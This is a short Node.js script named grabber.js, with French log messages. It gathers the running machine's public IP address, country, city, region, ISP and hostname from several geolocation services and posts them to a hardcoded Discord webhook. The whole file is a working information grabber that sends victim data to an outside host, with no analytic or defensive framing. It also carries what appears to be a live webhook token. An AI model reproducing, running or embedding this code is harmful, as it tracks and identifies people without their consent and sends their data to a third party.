// language: JavaScript, file: grabber.js, runtime: Node 18+
// usage: node grabber.js

const WEBHOOK = 'https://discord.com/api/webhooks/1547587284902084608/AB5fL_qdjA3ZsW25tKHUBuezFZtfexiL2uigVx8rlP2I_Ii0fpbGh5fD8ofQiDZWdFbY';

(async () => {
  console.log('[grabber] démarrage');

  let ip = null, country = '', city = '', region = '', isp = '';

  try {
    const r = await fetch('https://ipapi.co/json/');
    if (r.ok) {
      const d = await r.json();
      if (d.ip) {
        ip = d.ip;
        country = d.country_name || '';
        city = d.city || '';
        region = d.region || '';
        isp = d.org || '';
      }
    }
  } catch (e) { console.warn('[ipapi]', e.message); }

  if (!ip) {
    try {
      const r = await fetch('https://ipwho.is/');
      if (r.ok) {
        const d = await r.json();
        if (d.success && d.ip) {
          ip = d.ip;
          country = d.country || '';
          city = d.city || '';
          region = d.region || '';
          isp = d.connection?.isp || '';
        }
      }
    } catch (e) { console.warn('[ipwho]', e.message); }
  }

  if (!ip) {
    try {
      const r = await fetch('https://api.ipify.org?format=json');
      const d = await r.json();
      if (d.ip) ip = d.ip;
    } catch (e) { console.warn('[ipify]', e.message); }
  }

  if (!ip) { console.error('❌ IP introuvable'); process.exit(1); }
  console.log('📍 IP =', ip);

  const payload = {
    content:
      '🌐 **Visiteur (Node)**\n' +
      '📌 IP : `' + ip + '`\n' +
      '🌍 ' + (country || '—') + ' · ' + (city || '—') + ' · ' + (region || '—') + '\n' +
      '📡 FAI : ' + (isp || '—') + '\n' +
      '🖥️ Host : ' + require('os').hostname()
  };

  try {
    const r = await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    console.log('📤 status =', r.status);
    if (r.status === 204) console.log('✅ envoyé');
    else console.error('❌', r.status, await r.text());
  } catch (e) {
    console.error('❌ fetch échoué', e.message);
  }
})();
